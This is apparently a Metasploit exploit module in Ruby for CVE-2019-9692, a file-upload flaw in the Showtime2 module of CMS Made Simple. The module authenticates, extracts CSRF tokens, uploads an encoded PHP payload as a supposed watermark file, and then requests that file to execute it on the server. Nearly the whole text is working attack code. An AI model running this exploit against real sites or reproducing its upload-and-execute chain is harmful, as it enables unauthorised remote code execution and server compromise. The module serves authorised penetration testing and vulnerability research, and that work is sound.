# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039; => "CMS Made Simple (CMSMS) Showtime2 File Upload RCE",
      &#039;Description&#039; => %q(
        This module exploits a File Upload vulnerability that lead in a RCE in
        Showtime2 module (<= 3.6.2) in CMS Made Simple (CMSMS). An authenticated
        user with "Use Showtime2" privilege could exploit the vulnerability.

        The vulnerability exists in the Showtime2 module, where the class
        "class.showtime2_image.php" does not ensure that a watermark file
        has a standard image file extension (GIF, JPG, JPEG, or PNG).

        Tested on Showtime2 3.6.2, 3.6.1, 3.6.0, 3.5.4, 3.5.3, 3.5.2, 3.5.1, 3.5.0,
        3.4.5, 3.4.3, 3.4.2 on CMS Made Simple (CMSMS) 2.2.9.1
      ),
      &#039;License&#039; => MSF_LICENSE,
      &#039;Author&#039; =>
        [
          &#039;Daniele Scanu&#039;, # Discovery & PoC
          &#039;Fabio Cogno&#039; # Metasploit module
        ],
      &#039;References&#039; =>
        [
          [&#039;CVE&#039;, &#039;2019-9692&#039;],
          [&#039;CWE&#039;, &#039;434&#039;],
          [&#039;EDB&#039;, &#039;46546&#039;],
          [&#039;URL&#039;, &#039;https://forum.cmsmadesimple.org/viewtopic.php?f=1&t=80285&#039;],
          [&#039;URL&#039;, &#039;http://viewsvn.cmsmadesimple.org/diff.php?repname=showtime2&path=%2Ftrunk%2Flib%2Fclass.showtime2_image.php&rev=47&#039;]
        ],
      &#039;Platform&#039; => &#039;php&#039;,
      &#039;Arch&#039; => ARCH_PHP,
      &#039;Targets&#039; => [[&#039;Automatic&#039;, {}]],
      &#039;Privileged&#039; => false,
      &#039;DisclosureDate&#039; => "Mar 11 2019",
      &#039;DefaultTarget&#039; => 0))

    register_options(
      [
        OptString.new(&#039;TARGETURI&#039;, [true, "Base CMS Made Simple directory path", &#039;/&#039;]),
        OptString.new(&#039;USERNAME&#039;, [true, "Username to authenticate with", &#039;&#039;]),
        OptString.new(&#039;PASSWORD&#039;, [false, "Password to authenticate with", &#039;&#039;])
      ]
    )
  end

  def do_login
    res = send_request_cgi(
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;admin&#039;, &#039;login.php&#039;),
      &#039;vars_post&#039; => {
        &#039;username&#039; => datastore[&#039;username&#039;],
        &#039;password&#039; => datastore[&#039;password&#039;],
        &#039;loginsubmit&#039; => &#039;Submit&#039;
      }
    )

    unless res
      fail_with(Failure::Unreachable, &#039;Connection failed&#039;)
    end

    if res.code == 302
      @csrf_name = res.headers[&#039;Location&#039;].scan(/([^?=&]+)[=([^&]*)]?/).flatten[-2].to_s
      @csrf_value = res.headers[&#039;Location&#039;].scan(/([^?=&]+)[=([^&]*)]?/).flatten[-1].to_s
      @cookies = res.get_cookies
      return
    end

    fail_with(Failure::NoAccess, &#039;Authentication was unsuccessful&#039;)
  end

  def upload(fname, fcontent)
    # construct POST data
    data = Rex::MIME::Message.new
    data.add_part(&#039;Showtime2,m1_,defaultadmin,0&#039;, nil, nil, "form-data; name=\"mact\"")
    data.add_part(&#039;Upload&#039;, nil, nil, "form-data; name=\"m1_upload_submit\"")
    data.add_part(@csrf_value, nil, nil, "form-data; name=\"#{@csrf_name}\"")
    data.add_part(fcontent, &#039;text/plain&#039;, nil, "from-data; name=\"m1_input_browse\"; filename=\"#{fname}\"")

    res = send_request_cgi(
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039; => normalize_uri(target_uri, &#039;admin&#039;, &#039;moduleinterface.php&#039;),
      &#039;ctype&#039; => "multipart/form-data; boundary=#{data.bound}",
      &#039;data&#039; => data.to_s,
      &#039;headers&#039; => {
        &#039;Cookie&#039; => @cookies
      }
    )

    unless res
      fail_with(Failure::Unreachable, &#039;Connection failed&#039;)
    end

    if res.code == 200 && (res.body =~ /#{Regexp.escape(fname)}/i || res.body =~ /id="showoverview"/i)
      return
    end

    print_warning(&#039;No confidence in PHP payload success or failure&#039;)
  end

  def check
    res = send_request_cgi(
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;modules&#039;, &#039;Showtime2&#039;, &#039;moduleinfo.ini&#039;)
    )

    unless res
      vprint_error &#039;Connection failed&#039;
      return CheckCode::Unknown
    end

    if res.code == 200
      module_version = Gem::Version.new(res.body.scan(/^version = "?(\d\.\d\.\d)"?/).flatten.first)
      if module_version < Gem::Version.new(&#039;3.6.3&#039;)
        vprint_status("Showtime2 version: #{module_version}")
        return Exploit::CheckCode::Appears
      end
    end

    return Exploit::CheckCode::Safe
  end

  def exploit
    unless Exploit::CheckCode::Appears == check
      fail_with(Failure::NotVulnerable, &#039;Target is not vulnerable.&#039;)
    end

    @csrf_name = nil
    @csrf_value = nil
    @cookies = nil

    do_login

    # Upload PHP payload
    fname = "#{rand_text_alphanumeric(3..9)}.php"
    fcontent = "<?php #{payload.encode} ?>"
    print_status(&#039;Uploading PHP payload.&#039;)
    upload(fname, fcontent)

    # Register uploaded PHP payload file for cleanup
    register_files_for_cleanup(&#039;./&#039; + fname)

    # Retrieve and execute PHP payload
    print_status("Making request for &#039;/#{fname}&#039; to execute payload.")
    send_request_cgi(
      {
        &#039;method&#039; => &#039;GET&#039;,
        &#039;uri&#039; => normalize_uri(target_uri.path, &#039;uploads&#039;, &#039;images&#039;, fname)
      },
      15
    )
  end
end

